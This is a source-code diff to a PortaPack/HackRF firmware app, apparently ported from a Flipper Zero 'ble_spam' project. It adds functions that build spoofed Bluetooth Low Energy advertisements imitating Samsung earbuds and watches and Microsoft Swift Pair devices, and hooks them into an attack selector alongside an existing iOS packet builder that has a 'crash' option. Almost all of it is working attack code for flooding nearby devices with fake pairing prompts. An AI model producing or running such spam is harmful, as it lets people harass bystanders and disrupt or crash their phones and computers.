@@ -20,6 +20,9 @@
  * Boston, MA 02110-1301, USA.
  */
 
+// Code from https://github.com/Flipper-XFW/Xtreme-Apps/tree/04c3a60093e2c2378e79498b4505aa8072980a42/ble_spam/protocols
+// Thanks for the work of the original creators!
+
 #include "ui_blespam.hpp"
 #include "ui_modemsetup.hpp"
 
@@ -141,9 +144,149 @@ void BLESpamView::furi_hal_random_fill_buf(uint8_t* buf, uint32_t len) {
     }
 }
 
+void BLESpamView::createSamsungPacket() {
+    EasysetupCfg* cfg = NULL;
+    uint8_t packet_SamsungSizes[] = {0, 31, 15};
+    EasysetupType type;
+    if (cfg && cfg->type != 0x00) {
+        type = cfg->type;
+    } else {
+        const EasysetupType types[] = {
+            EasysetupTypeBuds,
+            EasysetupTypeWatch,
+        };
+        type = types[rand() % COUNT_OF(types)];
+    }
+
+    uint8_t size = packet_SamsungSizes[type];
+    uint8_t* packet = (uint8_t*)malloc(size);
+    uint8_t i = 0;
+
+    switch (type) {
+        case EasysetupTypeBuds: {
+            uint32_t model;
+            switch (PayloadModeRandom) {
+                case PayloadModeRandom:
+                default:
+                    model = buds_models[rand() % buds_models_count].value;
+                    break;
+                case PayloadModeValue:
+                    model = cfg->data.buds.model;
+                    break;
+            }
+
+            packet[i++] = 27;    // Size
+            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
+            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
+            packet[i++] = 0x00;  // ...
+            packet[i++] = 0x42;
+            packet[i++] = 0x09;
+            packet[i++] = 0x81;
+            packet[i++] = 0x02;
+            packet[i++] = 0x14;
+            packet[i++] = 0x15;
+            packet[i++] = 0x03;
+            packet[i++] = 0x21;
+            packet[i++] = 0x01;
+            packet[i++] = 0x09;
+            packet[i++] = (model >> 0x10) & 0xFF;  // Buds Model / Color (?)
+            packet[i++] = (model >> 0x08) & 0xFF;  // ...
+            packet[i++] = 0x01;                    // ... (Always static?)
+            packet[i++] = (model >> 0x00) & 0xFF;  // ...
+            packet[i++] = 0x06;
+            packet[i++] = 0x3C;
+            packet[i++] = 0x94;
+            packet[i++] = 0x8E;
+            packet[i++] = 0x00;
+            packet[i++] = 0x00;
+            packet[i++] = 0x00;
+            packet[i++] = 0x00;
+            packet[i++] = 0xC7;
+            packet[i++] = 0x00;
+
+            packet[i++] = 16;    // Size
+            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
+            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
+            // Truncated AD segment, Android seems to fill in the rest with zeros
+            break;
+        }
+        case EasysetupTypeWatch: {
+            uint8_t model;
+            switch (PayloadModeRandom) {
+                case PayloadModeRandom:
+                default:
+                    model = watch_models[rand() % watch_models_count].value;
+                    break;
+                case PayloadModeValue:
+                    model = cfg->data.watch.model;
+                    break;
+            }
+
+            packet[i++] = 14;    // Size
+            packet[i++] = 0xFF;  // AD Type (Manufacturer Specific)
+            packet[i++] = 0x75;  // Company ID (Samsung Electronics Co. Ltd.)
+            packet[i++] = 0x00;  // ...
+            packet[i++] = 0x01;
+            packet[i++] = 0x00;
+            packet[i++] = 0x02;
+            packet[i++] = 0x00;
+            packet[i++] = 0x01;
+            packet[i++] = 0x01;
+            packet[i++] = 0xFF;
+            packet[i++] = 0x00;
+            packet[i++] = 0x00;
+            packet[i++] = 0x43;
+            packet[i++] = (model >> 0x00) & 0xFF;  // Watch Model / Color (?)
+            break;
+        }
+        default:
+            break;
+    }
+    // size, packet
+    std::string res = to_string_hex_array(packet, size);
+    memset(advertisementData, 0, sizeof(advertisementData));
+    std::copy(res.begin(), res.end(), advertisementData);
+    free(packet);
+}
+
+void BLESpamView::createWindowsPacket() {
+    /*  const char* names[] = {
+          "PortaPack",
+          "HackRf",
+          "iOS 21 🍎",
+          "WorkMate",
+          "👉👌",
+          "🔵🦷",
+      };*/
+    const char* name = "PortaPack";
+    // name = names[rand() % 6];
+
+    uint8_t name_len = strlen(name);
+
+    uint8_t size = 7 + name_len;
+    uint8_t* packet = (uint8_t*)malloc(size);
+    uint8_t i = 0;
+
+    packet[i++] = size - 1;              // Size
+    packet[i++] = 0xFF;                  // AD Type (Manufacturer Specific)
+    packet[i++] = 0x06;                  // Company ID (Microsoft)
+    packet[i++] = 0x00;                  // ...
+    packet[i++] = 0x03;                  // Microsoft Beacon ID
+    packet[i++] = 0x00;                  // Microsoft Beacon Sub Scenario
+    packet[i++] = 0x80;                  // Reserved RSSI Byte
+    memcpy(&packet[i], name, name_len);  // Device Name
+    i += name_len;
+
+    // size, packet
+    std::string res = to_string_hex_array(packet, size);
+    memset(advertisementData, 0, sizeof(advertisementData));
+    std::copy(res.begin(), res.end(), advertisementData);
+    free(packet);
+}
+
 void BLESpamView::createIosPacket(bool crash = false) {
     ContinuityCfg* cfg = NULL;
-
+    uint8_t ios_packet_sizes[18] = {0, 0, 0, 0, 0, 24, 0, 31, 0, 12, 0, 0, 20, 0, 12, 11, 11, 17};
     ContinuityType type;
     if (cfg && cfg->type != 0x00) {
         type = cfg->type;
@@ -372,6 +515,12 @@ void BLESpamView::changePacket(bool forced = false) {
                     break;
                 case ATK_IOS:
                     createIosPacket(false);
+                    break;
+                case ATK_SAMSUNG:
+                    createSamsungPacket();
+                    break;
+                case ATK_WINDOWS:
+                    createWindowsPacket();
                     break;
                 default:
                 case ATK_ANDROID:
